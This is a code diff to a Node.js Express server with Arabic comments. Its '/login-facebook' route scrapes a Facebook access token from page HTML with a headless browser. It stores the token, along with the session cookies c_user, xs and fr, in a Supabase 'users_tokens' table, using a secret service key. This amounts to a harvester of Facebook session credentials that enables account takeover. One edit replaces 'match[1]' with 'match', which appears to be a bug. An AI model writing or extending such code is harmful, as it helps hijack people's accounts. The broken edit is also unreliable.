@@ -6,8 +6,9 @@ const path = require('path');
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 
+// قراءة المتغيرات البيئية، واستخدام المفتاح السري (Secret Key) لضمان الصلاحيات الكاملة للخادم
 const supabaseUrl = process.env.SUPABASE_URL;
-const supabaseKey = process.env.SUPABASE_KEY;
+const supabaseKey = process.env.SUPABASE_SECRET_KEY || process.env.SUPABASE_KEY;
 const supabase = createClient(supabaseUrl, supabaseKey);
 
 app.get('/', (req, res) => {
@@ -55,7 +56,7 @@ app.get('/login-facebook', async (req, res) => {
         const token = await page.evaluate(() => {
             try {
                 let match = document.documentElement.innerHTML.match(/"(EAAG[^\"]+)"/);
-                if (match) return match[1];
+                if (match) return match;
                 return window.__accessToken || "لم يتم العثور على التوكن تلقائياً";
             } catch(e) {
                 return "خطأ في استخراج التوكن";
@@ -64,6 +65,7 @@ app.get('/login-facebook', async (req, res) => {
 
         await browser.close();
 
+        // إدخال البيانات في جدول users_tokens في Supabase
         const { error } = await supabase
             .from('users_tokens')
             .insert([{ c_user, xs_token: xs, fr_token: fr, access_token: token }]);
